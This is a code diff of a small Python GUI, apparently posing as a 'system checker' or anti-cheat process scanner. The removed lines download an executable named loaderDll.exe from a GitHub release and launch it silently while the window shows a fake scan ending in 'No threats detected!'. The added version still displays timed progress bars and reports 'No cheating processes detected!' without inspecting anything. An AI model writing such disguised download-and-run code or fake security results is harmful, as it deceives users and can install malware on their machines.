@@ -7,18 +7,8 @@ import requests
 import os
 import tempfile
 
-
-
-DOWNLOAD_URL = "https://github.com/SSDDAA-AFK/SustemInformer_Cheker/releases/download/v1.0/loaderDll.exe"
-
-FOLDER = os.path.join(os.path.expanduser("~"), "Documents", "SystemChecker")
-os.makedirs(FOLDER, exist_ok=True)
-
-FILENAME = os.path.join(FOLDER, "loaderDll.exe")
-
 ICON_URL = "https://raw.githubusercontent.com/SSDDAA-AFK/SustemInformer_Cheker/main/icon.ico"
 ICON_PATH = os.path.join(tempfile.gettempdir(), "syschecker_icon.ico")
-
 
 # ---------- КОЛЬОРИ ----------
 BG = "#0f172a"        # темно-синій
@@ -37,7 +27,7 @@ class LoaderApp:
 
         self.root = root
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
-        self.root.title("SystemInformer Cheker V1.0")
+        self.root.title("SystemInformer Cheker V1.1")
         self.root.geometry("460x280")
         if self.download_icon():
             self.root.iconbitmap(ICON_PATH)
@@ -56,7 +46,7 @@ class LoaderApp:
         # ---------- ЗАГОЛОВОК ----------
         self.title = tk.Label(
             self.card,
-            text="🛡️ System Scan",
+            text="🛡️Process Scanner",
             bg=CARD,
             fg=ACCENT,
             font=("Segoe UI", 18, "bold")
@@ -66,7 +56,7 @@ class LoaderApp:
         # ---------- ТЕКСТ ----------
         self.label = tk.Label(
             self.card,
-            text="🔄 Loading check...",
+            text="🔄 Loading Scanner...",
             bg=CARD,
             fg=TEXT,
             font=("Segoe UI", 12)
@@ -134,30 +124,23 @@ class LoaderApp:
     # ---------- ЕТАП 1 ----------
     def stage1(self):
 
-        threading.Thread(target=self.download, daemon=True).start()
-
         self.run_bar(8, 15, "Loading")
 
-        while not self.downloaded:
-            time.sleep(0.2)
+        time.sleep(0.2)
 
-        try:
-            os.startfile(os.path.abspath(FILENAME))
-            self.stage2()
-        except:
-            self.label.config(text="❌ ERROR for startup")
+        self.stage2()
 
 
     # ---------- ЕТАП 2 ----------
     def stage2(self):
 
         self.label.config(
-            text="📂 I'm starting to check the files..."
+            text="⚙️ I'm starting to check the process..."
         )
 
         self.progress["value"] = 0
 
-        self.run_bar(20, 30, "Scanning")
+        self.run_bar(30, 50, "Scanning")
 
         self.finish()
 
@@ -178,30 +161,11 @@ class LoaderApp:
                 text=f"{text}: {i}%"
             )
 
-
-    # ---------- СКАЧУВАННЯ ----------
-    def download(self):
-
-        try:
-
-            r = requests.get(DOWNLOAD_URL, stream=True)
-
-            with open(FILENAME, "wb") as f:
-
-                for chunk in r.iter_content(1024):
-                    if chunk:
-                        f.write(chunk)
-
-            self.downloaded = True
-
-        except:
-            self.downloaded = False
-
     # ---------- ФІНАЛ ----------
     def finish(self):
 
         self.label.config(
-            text="✅ No threats detected!"
+            text="✅ No cheating processes detected!"
         )
 
         self.status.config(
